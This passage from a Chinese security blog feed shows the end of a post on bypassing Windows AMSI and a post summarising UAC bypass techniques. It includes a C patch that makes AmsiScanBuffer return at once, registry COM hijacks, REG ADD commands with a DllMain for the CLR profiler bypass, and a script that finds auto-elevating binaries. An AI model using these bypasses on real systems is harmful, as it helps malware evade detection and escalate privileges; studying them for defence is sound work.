<span class="hljs-constructor">WriteProcessMemory(<span class="hljs-params">pi</span>.<span class="hljs-params">hProcess</span>, (LPVOID)</span>pAmsiScanBuffer, &amp;patch, sizeof(<span class="hljs-built_in">char</span>), NULL);<br>    <span class="hljs-constructor">VirtualProtectEx(<span class="hljs-params">pi</span>.<span class="hljs-params">hProcess</span>, (LPVOID)</span>pAmsiScanBuffer, <span class="hljs-number">1</span>, oldProtect, NULL);<br>    <span class="hljs-constructor">CloseHandle(<span class="hljs-params">pi</span>.<span class="hljs-params">hProcess</span>)</span>;<br>    <span class="hljs-constructor">CloseHandle(<span class="hljs-params">pi</span>.<span class="hljs-params">hThread</span>)</span>;<br>    <span class="hljs-constructor">FreeLibrary(<span class="hljs-params">hAmsi</span>)</span>;<br>    return <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>0xc3的硬编码对应的汇编是ret，也就是调用AmsiScanBuffer直接让他返回。这个马是直接被杀的。</p><h2 id="非主流对抗"><a href="#非主流对抗" class="headerlink" title="非主流对抗"></a>非主流对抗</h2><h3 id="1-劫持amsi-dll"><a href="#1-劫持amsi-dll" class="headerlink" title="1.劫持amsi.dll"></a>1.劫持amsi.dll</h3><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>由于研发人员使用 LoadLibrary函数导入dll的时候没有使用绝对路径，因此程序会首先在当前目录下寻找dll</p><p>因此我们在 powershell.exe同目录下放一个amsi.dll做劫持</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">amsi.dll<span class="hljs-string">`的默认目录：`</span>c:<span class="hljs-regexp">/windows/</span>system32/amsi.dll<br></code></pre></td></tr></table></figure><p>还要考虑<code>amsi.dll</code>的导出函数，使用 Aheadlib工具生成或者自己找到 amsi.dll 对应的导出函数，自己写，一样的。当然自己的dll没有签名，这里还涉及到免杀的问题，如果可以添加微软前面，再劫持，又有很大的可玩性。</p><h3 id="2-NULL字符绕过"><a href="#2-NULL字符绕过" class="headerlink" title="2.NULL字符绕过"></a>2.NULL字符绕过</h3><p>这个方法已经失效了，但还是提一下，扩充下思路。</p><p>Amsi扫描使用的是 <code>AmsiScanString</code>函数</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sqf">HRESULT WINAPI AmsiScanString(<br><span class="hljs-variable">_In_</span> HAMSICONTEXT amsiContext,<br><span class="hljs-variable">_In_LPCWSTR</span> string, <span class="hljs-comment">// Will be terminated at the first null</span><br>character<br><span class="hljs-variable">_In_LPCWSTR</span> contentName,<br><span class="hljs-variable">_In_opt_HAMSISESSION</span> session,<br><span class="hljs-variable">_Out_AMSI_RESULT</span> *result<br>);<br></code></pre></td></tr></table></figure><p>其中string就是脚本内容，在执行脚本之前加个空字符就可以截断，而修复的方法是用了 <code>AmsiScanBuffer</code>这个函数，所以amsi才会用这两个函数来扫描</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sqf">HRESULT WINAPI AmsiScanBuffer(<br><span class="hljs-variable">_In_</span>HAMSICONTEXT amsiContext,<br><span class="hljs-variable">_In_</span>PVOID buffer, <span class="hljs-comment">// Not terminated at the null character</span><br><span class="hljs-variable">_In_</span> ULONG length,<br><span class="hljs-variable">_In_</span>LPCWSTR contentName,<br><span class="hljs-variable">_In_</span> opt_HAMSISESSION session,<br><span class="hljs-variable">_Out_</span> AMSI_RESULT *result<br>);<br></code></pre></td></tr></table></figure><h3 id="3-COM-server劫持"><a href="#3-COM-server劫持" class="headerlink" title="3.COM server劫持"></a>3.COM server劫持</h3><p>原理：amsi.dll在老版本中使用 CoCreateInstance()函数调用IID和CLSID来实例化COM接口。而这个函数会先<br>从注册表HKCU中找对应的dll去解析，也就是当前用户，因此我们创建相应的注册表，让它调用失败就行了。简单来说利用的是注册表优先级来绕过。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">Windows Registry Editor Version <span class="hljs-number">5.00</span><br>[HKEY_CURRENT_USER<span class="hljs-regexp">/Software/</span>Classes<span class="hljs-regexp">/CLSID/</span>&#123;fdb00e52-a214-<span class="hljs-number">4</span>aa1-<span class="hljs-number">8</span>fba-<br><span class="hljs-number">4357</span>bb0072ec&#125;]<br><br>[HKEY_CURRENT_USER<span class="hljs-regexp">/Software/</span>Classes<span class="hljs-regexp">/CLSID/</span>&#123;fdb00e52-a214-<span class="hljs-number">4</span>aa1-<span class="hljs-number">8</span>fba-<span class="hljs-number">4357</span>bb0072ec&#125;/InProcServer32]<br>@=<span class="hljs-string">&quot;C://goawayamsi.dll&quot;</span><br></code></pre></td></tr></table></figure><p>而微软通过直接调用amsi.dll 的 <code>DllGetClassObject()</code> 函数替换 <code>CoCreateInstance()</code>，<br>可以避免注册表解析。</p><p>但是这种方法也失效了，不过可以学习下思路。</p><h2 id="最后"><a href="#最后" class="headerlink" title="## 最后"></a>## 最后</h2><p>AMSI 也还是有更多的方向可以研究，混淆等等 但更了解powershell 对于bypass有更好的帮助 还一个平台可参考用用<a href="https://amsi.fail/">https://amsi.fail/</a></p><p>在线生成的平台</p><p> <img src="/2022/03/26/bypass-AMSI/image-20220326115012141.png" alt="image-20220326115012141"></p><p>参考:</p><blockquote><p>《Bypass AMSI的前世今生》by L.N.</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>绕过</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AMSI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bypassUAC总结</title>
    <link href="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/"/>
    <url>/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h1><p>用户帐户控制（User Account Control，简写作UAC)是<a href="https://baike.baidu.com/item/%E5%BE%AE%E8%BD%AF">微软</a>公司在其[Windows Vista](<a href="https://baike.baidu.com/item/Windows">https://baike.baidu.com/item/Windows</a> Vista)及更高版本操作系统中采用的一种控制机制，保护系统进行不必要的更改，提升操作系统的稳定性和安全性。<br>管理员在正常情况下是以低权限运行任务的，这个状态被称为被保护的管理员。但当管理员要执行高风险操作（如安装程序等），就需要提升权限去完成这些任务。这个提升权限的过程通常是这样的，相信各位都眼熟过。</p><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318092800610.png" alt="image-20220318092800610"></p><p>点击“是”，管理员就会提升到高权限再去运行该任务。</p><p>而在这些程序里面，有的需要授权、有的不需要，是因为UAC是分授权等级的</p><p>首先请按Win+R，输入gpedit.msc，打开组策略。</p><p>然后我们在左侧窗口找到“计算机配置–Windows设置–安全设置–本地策略–安全选项”，再在右侧窗口找到“用户帐户控制：管理员批准模式中管理员的提升权限提示的行为”，双击该条目，打开设置窗口，如下图：</p><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318093018017.png" alt="image-20220318093018017"></p><ul><li>不提示直接提升：关闭UAC，需要权限时直接提升权限。</li><li>在安全桌面上提示凭据：需要权限时在安全桌面上输入管理员密码提升权限。</li><li>在安全桌面上同意提示：需要权限时在安全桌面上选择“允许”提升权限。</li><li>提示凭据：需要权限时在普通窗口中输入管理员密码提升权限。</li><li>同意提示：需要权限时在普通窗口中选择“允许”提升权限。</li><li>非 Windows 二进制文件的同意提示：(默认设置)当非 Microsoft 应用程序的某个操作需要提升权限时，选择“允许”提升权限。</li></ul><p>因为普通应用执行权限有限，某些操作必然会要求更高的管理员权限。此时，通常就需要一个权限提升的操作。程序可以向系统请求提权，系统会将此请求通过提一个提示框，请用户确认。</p><p>如果当前用户的用户组权限不是管理员，提权操作是要求输入管理员密码的，这点和在Linux中的相应操作类似。</p><p>•程序只能在运行前要求提权。如果已经在运行了，那么将失去申请提权的能力•权限提升仅对此次进程有效</p><p>提升权限的操作大致有两个：</p><p>•自动提权请求•手动提权请求</p><p>手动提权就是“以管理员身份运行”，自动提权请求就是程序本身就一运行就开始申请权限，如：注册表编辑器</p><p>在开发的过程中，程序员若要开发一个程序，可以在编译器配置，写入一个配置文件，用于向系统标识该应用程序是必须要管理员权限运行的。</p><p><strong>visual studio里面的uac</strong></p><p>在visual studio里面有一个manifest文件，这个文件本质上是一个xml文件，用于标识当前应用程序的配置属性。其中这几个级别明细如下</p><blockquote><p>•aslnvoker 默认权限</p><p>•highestAvailable 最高权限</p><p>•requireAdministrator 必须是管理员权限</p></blockquote><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318093153499.png" alt="image-20220318093153499"></p><p>将编译选项调整为requireAdministrator，则当用户运行程序后，将获得管理员权限会话,不需要绕过UAC。</p><h2 id="bypassUAC"><a href="#bypassUAC" class="headerlink" title="bypassUAC"></a>bypassUAC</h2><h3 id="autoElevate"><a href="#autoElevate" class="headerlink" title="autoElevate"></a>autoElevate</h3><p>当某个EXE文件的文件清单里有<autoElevate> 元素时，当执行该文件时会默认提权执行。<br>我们劫持该exe文件的dll，可以达到Bypass UAC提权的目的。<br>适用范围:管理员权限以获得，要得到高权限管理员权限</autoElevate></p><p>一般用工具sigcheck检测</p><p>网上常拿C:/Windows/SysWOW64/SystemPropertiesAdvanced.exe 举列子</p><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318093759628.png" alt="image-20220318093759628"></p><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318093806737.png" alt="image-20220318093806737"></p><h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><p>参考:<a href="https://www.anquanke.com/post/id/209033">https://www.anquanke.com/post/id/209033</a><br><a href="https://www.cnblogs.com/0daybug/p/11719541.html">https://www.cnblogs.com/0daybug/p/11719541.html</a></p><p>exe文件运行时会加载许多dll文件，这些dll文件的加载顺序是</p><ul><li><p>程序所在目录</p></li><li><p>系统目录即<code>SYSTEM32</code>目录</p></li><li><p>16位系统目录即<code>SYSTEM</code>目录</p></li><li><p><code>Windows</code>目录</p></li><li><p>程序加载目录(<code>SetCurrentDirecctory</code>)</p></li><li><p><code>PATH</code>环境变量中列出的目录</p><p>同时，dll加载也遵循着<code>Know DLLs注册表项</code>的机制：Know DLLs注册表项指定的DLL是已经被操作系统加载过后的DLL，不会被应用程序搜索并加载。在注册表HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Session Manager/KnownDLLS处可以看见这些dll</p></li></ul><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318094048901.png" alt="image-20220318094048901"></p><p>在knowdlls表项中的dll是预先就加载进内存空间的，被诸多应用调用着，改动需要高权限。</p><p>如果我们在应用程序找到正确的dll之前，将我们自己创造的dll放入优先级更高的搜索目录让应用程序优先加载此dll文件，这就造成了dll劫持。但这只是dll劫持的其中一种途径，他有这些途径：</p><p>（1） DLL替换：用恶意的DLL替换掉合法的DLL<br>（2） DLL搜索顺序劫持：当应用程序加载DLL的时候，如果没有带指定DLL的路径，那么程序将会以特定的顺序依次在指定的路径下搜索待加载的DLL。通过将恶意DLL放在真实DLL之前的搜索位置，就可以劫持搜索顺序，劫持的目录有时候包括目标应用程序的工作目录。<br>（3） 虚拟DLL劫持：释放一个恶意的DLL来代替合法应用程序加载的丢失/不存在的DLL<br>（4） DLL重定向：更改DLL搜索的路径，比如通过编辑%PATH%环境变量或 .exe.manifest/.exe.local文件以将搜索路径定位到包含恶意DLL的地方。<br>（5） WinSxS DLL替换：将目标DLL相关的WinSxS文件夹中的合法DLL替换为恶意DLL。此方法通常也被称为DLL侧加载<br>（6） 相对路径DLL劫持：将合法的应用程序复制（并有选择地重命名）与恶意的DLL一起放入到用户可写的文件夹中。在使用方法上，它与（签名的）二进制代理执行有相似之处。它的一个变体是（有点矛盾地称为）“自带LOLbin”，其中合法的应用程序带有恶意的DLL（而不是从受害者机器上的合法位置复制）。</p><p>实验一：</p><p>这里我们先用第一种方法来进行实验，实验对象是C:/Windows/SysWOW64/SystemPropertiesAdvanced.exe和Listary。Listary是一个很好用的检索小工具，我通过processmonitor，设置好过滤条件，查看SystemPropertiesAdvanced.exe调用的dll时发现它会调用一个Listary下的一个名为ListaryHook.dll的dll。</p><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318094345887.png" alt="image-20220318094345887"></p><p>由于listary目录权限不高，我们可以直接替换该dll，换成dllmain为打开cmd的dll。然后点击运行SystemPropertiesAdvanced.exe，就会发现会弹出高权限cmd窗口</p><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318094411497.png" alt="image-20220318094411497"></p><p>bypassuac成功。 当然这种都不能算是一个洞，listary并不是人人电脑上都有的，而且这个软件装机量应该是极少数少的，所以这里只是提供一个思路，</p><p>参考：<a href="https://www.cnblogs.com/0daybug/p/11719541.html">https://www.cnblogs.com/0daybug/p/11719541.html</a></p><p>实验2：</p><p>这里使用第三种方法进行实验，实验对象是eventvwr.msc，它是管理工具中的事件查看器，它依赖于mmc.exe来运行。比如，你想运行它，就得通过mmc eventvwr.msc来运行它,并且在process exploer中只能看到个mmc.exe。</p><p>我们process monitor设置过滤如下</p><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318094517196.png" alt="image-20220318094517196"></p><p>cmd运行 mmc eventvwr.msc,查看调用</p><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318094527395.png" alt="image-20220318094527395"></p><p>dll搜索顺序确实是 程序目录-&gt;SYSTEM32-&gt;SYSTEM-&gt;WINDOWS-&gt;当前目录（这里也是SYSTEM32目录，我认为的原因是mmc会自动提升权限导致当前目录为System32导致的）-&gt;PATH目录。</p><p>我们只需在可写目录下植入名为elsext.dll的恶意dll，处理好dll的dllmain函数，就能让dllmain里的指令被高权限执行</p><h2 id="CLR加载任意DLL"><a href="#CLR加载任意DLL" class="headerlink" title="CLR加载任意DLL"></a>CLR加载任意DLL</h2><p>CLR是微软为.net运行时提供的环境，像java的虚拟机一样，而clr有一个Profiling机制。这个机制简而言之便是可以给CLR提供一个dll，当任何高权限.NET运行时都会主动加载该DLL，我们可以构造恶意dll给CLR加载，从而获得高权限的进程如cmd，从而bypassuac。</p><p>至于这个dll如何给CLR，是通过修改以下环境变量实现的</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">COR_ENABLE_PROFILING</span> = <span class="hljs-number">1</span><br><br><span class="hljs-attr">COR_PROFILER</span>=&#123;CLSIDor ProgID&#125;<br></code></pre></td></tr></table></figure><p>CLR会检查环境变量中的COR_ENABLE_PROFILING，若为1则检查通过，进行下一步。<br>在net4.0以前，若检查通过，会马上去查找COR_PROFILER指定的注册表项，找到其dll路径并加载<br>net4.0后，会先查找COR_PROFILER_PATH是否指定dll文件路径，若没有再去查找COR_PROFILER指定的注册表项，找到其dll路径并加载。<br>总而言之，我们设置好COR_ENABLE_PROFILING和COR_PROFILER两个项就可以了。</p><p>接下来我们设置用户环境变量，设置用户环境变量时不需要高权限（win10似乎设置系统环境变量也不需要）。<br>以及在注册表，在指定的CLSID属性下新建Inprocserver32项，并写入恶意dll路径. 然后通过mmc调用一下gpedit.msc这种程序，即可以高权限执行dll。如果dll执行命令为system(“cmd.exe”) 那么就会蹦出来高权限cmd窗口</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">REG ADD <span class="hljs-string">&quot;HKCU/Software/Classes/CLSID/&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;/InprocServer32&quot;</span> <span class="hljs-string">/ve</span> <span class="hljs-string">/t</span> REG_EXPAND_SZ <span class="hljs-string">/d</span> <span class="hljs-string">&quot;C:/test/calc.dll&quot;</span> <span class="hljs-string">/f</span><br>REG ADD <span class="hljs-string">&quot;HKCU/Environment&quot;</span> <span class="hljs-string">/v</span> <span class="hljs-string">&quot;COR_PROFILER&quot;</span> <span class="hljs-string">/t</span> REG_SZ <span class="hljs-string">/d</span> <span class="hljs-string">&quot;&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;&quot;</span> <span class="hljs-string">/f</span><br>REG ADD <span class="hljs-string">&quot;HKCU/Environment&quot;</span> <span class="hljs-string">/v</span> <span class="hljs-string">&quot;COR_ENABLE_PROFILING&quot;</span> <span class="hljs-string">/t</span> REG_SZ <span class="hljs-string">/d</span> <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-string">/f</span><br>mmc gpedit.msc<br></code></pre></td></tr></table></figure><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-built_in">BOOL</span> WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)<br>&#123;<br>    <span class="hljs-keyword">char</span> cmd[] = <span class="hljs-string">&quot;cmd.exe&quot;</span>;<br><br>    <span class="hljs-keyword">switch</span> (fdwReason)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        WinExec(cmd, SW_SHOWNORMAL);<br>        ExitProcess(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>另外的，你还可以为COR_PROFILER_PATH设置为如//server/share/test.dll的smb的路径，这样也可以实现bypassuac（没复现）</p><p>参考：<a href="https://www.const27.com/2021/06/28/Bypass%20UAC/">https://www.const27.com/2021/06/28/Bypass%20UAC/</a></p><h3 id="白名单程序"><a href="#白名单程序" class="headerlink" title="白名单程序"></a>白名单程序</h3><h3 id="odbcad32-exe"><a href="#odbcad32-exe" class="headerlink" title="odbcad32.exe"></a>odbcad32.exe</h3><p>这个方法很简单。打开C:/Windows/system32/odbcad32.exe，然后通过以下方法打开powershell或者cmd</p><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318094702785.png" alt="image-20220318094702785"></p><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318094743675.png" alt="image-20220318094743675"></p><p>成功bypass</p><h3 id="管理工具"><a href="#管理工具" class="headerlink" title="管理工具"></a>管理工具</h3><p>之前说过，管理工具有很多白名单程序，如果一个白名单程序有浏览文件目录的功能，就可以以此来创建高权限cmd窗口。这里拿事件查看器举例</p><p>操作-》打开保存的目录-》文件目录路径处输入powershell-》弹出高权限powershell 以此内推，还有很多相似的管理工具可以这样利用</p><h3 id="注册表劫持"><a href="#注册表劫持" class="headerlink" title="注册表劫持"></a>注册表劫持</h3><p>有一些系统程序是会直接获取管理员权限同时不弹出UAC弹窗，这类程序被称为白名单程序。这些程序拥有autoElevate属性的值为True，会在启动时就静默提升权限。</p><p>那么我们要寻找的uac程序需要符合以下几个要求：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 程序的manifest标识的配置属性 autoElevate 为true<br><span class="hljs-bullet">2.</span> 程序不弹出UAC弹窗<br><span class="hljs-bullet">3.</span> 从注册表里查询Shell/Open/command键值对<br></code></pre></td></tr></table></figure><p>首先是寻找autoElevate为true的程序，这里就写一个py脚本去批量跑一下，这里就找system32目录下面的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os <br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> * <br> <br>path = <span class="hljs-string">&#x27;c:/windows/system32&#x27;</span> <br>files = os.listdir(path) <br><span class="hljs-built_in">print</span>(files) <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GetFileList</span>(<span class="hljs-params">path, fileList</span>):</span> <br>    newDir = path <br>    <span class="hljs-keyword">if</span> os.path.isfile(path): <br>        <span class="hljs-keyword">if</span> path[-<span class="hljs-number">4</span>:] == <span class="hljs-string">&#x27;.exe&#x27;</span>: <br>            fileList.append(path) <br>    <span class="hljs-keyword">elif</span> os.path.isdir(path): <br>        <span class="hljs-keyword">try</span>: <br>            <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> os.listdir(path): <br>                newDir=os.path.join(path,s) <br>                GetFileList(newDir, fileList) <br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e: <br>            <span class="hljs-keyword">pass</span> <br>    <span class="hljs-keyword">return</span> fileList <br>files = GetFileList(path, []) <br><span class="hljs-built_in">print</span>(files) <br><br><span class="hljs-keyword">for</span> eachFile <span class="hljs-keyword">in</span> files: <br>    <span class="hljs-keyword">if</span> eachFile[-<span class="hljs-number">4</span>:] == <span class="hljs-string">&#x27;.exe&#x27;</span>: <br>        command = <span class="hljs-string">r&#x27;./sigcheck64.exe -m &#123;&#125; | findstr auto&#x27;</span>.<span class="hljs-built_in">format</span>(eachFile) <br>        <span class="hljs-built_in">print</span>(command) <br>        p1 = Popen(command, shell=<span class="hljs-literal">True</span>, stdin=PIPE, stdout=PIPE) <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&lt;autoElevate&gt;true&lt;/autoElevate&gt;&#x27;</span> <span class="hljs-keyword">in</span> p1.stdout.read().decode(<span class="hljs-string">&#x27;gb2312&#x27;</span>): <br>            copy_command = <span class="hljs-string">r&#x27;copy &#123;&#125; ./success&#x27;</span>.<span class="hljs-built_in">format</span>(eachFile) <br>            Popen(copy_command, shell=<span class="hljs-literal">True</span>, stdin=PIPE, stdout=PIPE) <br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(eachFile)) <br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;success.txt&#x27;</span>, <span class="hljs-string">&#x27;at&#x27;</span>) <span class="hljs-keyword">as</span> f: <br>                f.writelines(<span class="hljs-string">&#x27;&#123;&#125;/n&#x27;</span>.<span class="hljs-built_in">format</span>(eachFile))<br></code></pre></td></tr></table></figure><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318094904962.png" alt="image-20220318094904962"></p><p>整理之后exe如下所示</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs awk">c:<span class="hljs-regexp">/windows/</span>system32/bthudtask.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/changepk.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/ComputerDefaults.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/dccw.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/dcomcnfg.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/DeviceEject.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/DeviceProperties.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/djoin.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/easinvoker.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/EASPolicyManagerBrokerHost.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/eudcedit.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/eventvwr.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/fodhelper.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/fsquirt.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/FXSUNATD.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/immersivetpmvscmgrsvr.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/iscsicli.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/iscsicpl.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/lpksetup.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/MSchedExe.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/msconfig.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/msra.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/MultiDigiMon.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/newdev.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/odbcad32.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/PasswordOnWakeSettingFlyout.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/pwcreator.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/rdpshell.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/recdisc.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/rrinstaller.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/shrpubw.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/slui.exe <br>c:<span class="hljs-regexp">/windows/</span>system32<span class="hljs-regexp">/Sysprep/</span>sysprep.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/SystemPropertiesAdvanced.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/SystemPropertiesComputerName.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/SystemPropertiesDataExecutionPrevention.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/SystemPropertiesHardware.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/SystemPropertiesPerformance.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/SystemPropertiesProtection.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/SystemPropertiesRemote.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/SystemSettingsAdminFlows.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/SystemSettingsRemoveDevice.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/Taskmgr.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/tcmsetup.exe<br>c:<span class="hljs-regexp">/windows/</span>system32/TpmInit.exe 